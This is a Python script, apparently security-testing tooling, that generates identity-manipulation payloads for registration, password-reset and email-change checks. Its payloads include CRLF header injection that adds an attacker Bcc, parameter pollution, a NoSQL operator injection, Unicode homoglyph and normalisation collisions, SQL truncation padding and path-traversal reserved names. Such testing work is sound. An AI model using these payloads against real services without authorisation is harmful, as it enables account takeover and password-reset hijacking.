#!/usr/bin/env python3
"""Generate email / username manipulation candidates for registration, reset and
email-change testing (AB-09, AB-27..30, AB-33..35, AB-38). Offline only.

Usage:
  identity_variants.py --mode email     --email victim@example.test --attacker you@your-domain.test
  identity_variants.py --mode username  --username admin
  identity_variants.py --mode unicode   --email victim@example.test [--username admin]
  identity_variants.py --mode truncation --username admin [--max-len 64]
  identity_variants.py --mode reserved
  identity_variants.py --mode all       --email ... --attacker ... --username ...

Output: TSV  check_id <TAB> family <TAB> payload  (payloads are URL-encoded where noted with %XX;
send them raw in JSON bodies after decoding if the endpoint takes JSON).
"""
import argparse
import json
import sys
import unicodedata

CONFUSABLE = {
    # char -> list of look-alikes that fold to it under upper/lower/NFKC
    "i": ["\u0131", "\u0130", "\uff49", "\u2170"],      # dotless i, dotted I, fullwidth i, roman numeral i
    "k": ["\u212a", "\uff4b"],                          # Kelvin sign, fullwidth k
    "s": ["\u017f", "\uff53"],                          # long s, fullwidth s
    "a": ["\u0430", "\uff41", "\u1d43"],                # Cyrillic a, fullwidth a, modifier a
    "e": ["\u0435", "\uff45"],
    "o": ["\u043e", "\uff4f", "\u2092"],
    "c": ["\u0441", "\uff43", "\u217d"],
    "p": ["\u0440", "\uff50"],
    "d": ["\u217e", "\uff44"],
    "m": ["\u217f", "\uff4d"],
    "n": ["\uff4e", "\u207f"],
    "l": ["\u217c", "\uff4c"],
    "f": ["\uff46"],
}
RESERVED = ["admin", "administrator", "root", "login", "logout", "register", "signup", "api", "static", "assets",
            "settings", "account", "support", "help", "security", "billing", "www", "mail", "null", "undefined",
            ".well-known", "robots.txt", "favicon.ico", "sw.js", "service-worker.js", "sitemap.xml",
            "security.txt", "../admin", "..%2fadmin", "%2e%2e", "a/b", "index.html", "me", "self", "new", "edit"]


def out(rows, cid, fam, payloads):
    for p in payloads:
        rows.append((cid, fam, p))


def email_variants(victim, attacker):
    local, _, dom = victim.partition("@")
    alocal, _, adom = attacker.partition("@")
    v, a = victim, attacker
    rows = []
    out(rows, "AB-33/27", "case", [v.upper(), local.capitalize() + "@" + dom.capitalize(),
                                   "".join(c.upper() if i % 2 else c for i, c in enumerate(local)) + "@" + dom,
                                   local + "@" + dom.upper(), v + "."])
    out(rows, "AB-33/34", "plus-dot-quote", [f"{local}+1@{dom}", ".".join(local) + "@" + dom, f'"{local}"@{dom}',
                                            f"{local}.@{dom}"])
    out(rows, "AB-28/33", "whitespace-nul-control", [
        f"{v} a", f"{local}%00@{dom}", f"{local}%09@{dom}", f"{local}%20@{dom}", f" {v}", f"{v} ", f"{v}%00",
        f"{v}%0a", f"{v}%0d", f"{v}%0d%0a", f"%0a{v}", f"%0d%0a{v}", f"{v}\\n", f"{v}%E2%80%8B"])  # last = zero-width space
    out(rows, "AB-33", "multi-recipient-header-injection", [
        f"{v},{a}", f"{v};{a}", f"{v}|{a}", f"{v}%20{a}", f"{v}%0A%0Dcc:{a}", f"{v}%0A%0Dbcc:{a}",
        f"{v}%0d%0a{a}", f"{a}%0d%0a{v}", f"{a}:{v}", f'{a}","{v}', f"{v}%0d%0aBcc:%20{a}"])
    out(rows, "AB-18/33", "parameter-pollution(form)", [f"email={v}&email={a}", f"email={a}&email={v}",
                                                        f"email={v}&Email={a}", f"email[]={v}&email[]={a}"])
    out(rows, "AB-18/33", "parameter-pollution(json)", [json.dumps({"email": [v, a]}),
                                                        '{"email":"%s","email":"%s"}' % (v, a),
                                                        json.dumps({"email": {"$ne": ""}}),
                                                        json.dumps({"email": v, "Email": a})])
    out(rows, "AB-30/33", "authority-confusion", [f"{v}@{adom}", f"{local}@{dom}%40{adom}", f"{local}%40{dom}@{adom}",
                                                  f"{local}@{dom}.{adom}", f"{v}{{{{}}}}",
                                                  f"=?utf-8?q?{local}=40{dom}=3e=00?=@{adom}",
                                                  f"=?x?q?{local}=40{dom}=3e=20?=@{adom}"])
    return rows


def unicode_variants(victim=None, username=None):
    rows = []
    for label, s in (("email", victim), ("username", username)):
        if not s:
            continue
        local, at, dom = s.partition("@") if label == "email" else (s, "", "")
        seen = set()
        for idx, ch in enumerate(local):
            for alt in CONFUSABLE.get(ch.lower(), []):
                cand = local[:idx] + alt + local[idx + 1:]
                if cand in seen:
                    continue
                seen.add(cand)
                folds = []
                if cand.upper() == local.upper():
                    folds.append("upper()")
                if cand.lower() == local.lower():
                    folds.append("lower()")
                if unicodedata.normalize("NFKC", cand).lower() == local.lower():
                    folds.append("NFKC")
                if cand.casefold() == local.casefold():
                    folds.append("casefold()")
                tag = "folds via " + "/".join(folds) if folds else "homoglyph only (visual)"
                rows.append(("AB-29", f"unicode-{label} [{tag}] U+{ord(alt):04X}", cand + (at + dom if at else "")))
        full = "".join(chr(ord(c) + 0xFEE0) if "!" <= c <= "~" else c for c in local)
        rows.append(("AB-29", f"unicode-{label} [fullwidth, NFKC]", full + (at + dom if at else "")))
    return rows


def username_variants(u):
    rows = []
    out(rows, "AB-34/27", "case", [u.upper(), u.capitalize(), "".join(c.upper() if i % 2 else c for i, c in enumerate(u))])
    out(rows, "AB-34", "punctuation", [f"{u}=", f"{u}.", f"{u}_", f"{u}-", f"{u}/", f".{u}", f"{u}#", f"{u}?"])
    out(rows, "AB-28/34", "whitespace-nul-control", [f"{u} ", f" {u}", f"{u}%20", f"{u}%09", f"{u}%00", f"{u}%00x",
                                                     f"{u}%0a", f"{u}%0d%0a", f"{u}%E2%80%8B", f"{u}%C2%A0"])
    return rows


def truncation_variants(u, max_len):
    rows = []
    for n in sorted({16, 20, 32, 50, 64, 100, 128, 255, max_len}):
        if n <= len(u):
            continue
        pad = n - len(u)
        rows.append(("AB-35", f"sql-truncation len={n}+1", u + " " * pad + "x"))
        rows.append(("AB-35", f"sql-truncation-encoded len={n}+1", u + "%20" * pad + "x"))
    return rows


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--mode", required=True, choices=["email", "username", "unicode", "truncation", "reserved", "all"])
    ap.add_argument("--email")
    ap.add_argument("--attacker")
    ap.add_argument("--username")
    ap.add_argument("--max-len", type=int, default=64)
    a = ap.parse_args()
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")

    rows = []
    m = a.mode
    if m in ("email", "all"):
        if not (a.email and a.attacker and "@" in a.email and "@" in a.attacker):
            sys.exit("--mode email needs --email victim@dom and --attacker you@dom (both addresses you own)")
        rows += email_variants(a.email, a.attacker)
    if m in ("unicode", "all"):
        if not (a.email or a.username):
            sys.exit("--mode unicode needs --email and/or --username")
        rows += unicode_variants(a.email, a.username)
    if m in ("username", "all") and a.username:
        rows += username_variants(a.username)
    elif m == "username":
        sys.exit("--mode username needs --username")
    if m in ("truncation", "all") and a.username:
        rows += truncation_variants(a.username, a.max_len)
    elif m == "truncation":
        sys.exit("--mode truncation needs --username")
    if m in ("reserved", "all"):
        rows += [("AB-38", "reserved/path-overwrite", r) for r in RESERVED]

    print("check_id\tfamily\tpayload")
    seen = set()
    for cid, fam, p in rows:
        if p in seen:
            continue
        seen.add(p)
        print(f"{cid}\t{fam}\t{p}")


if __name__ == "__main__":
    main()
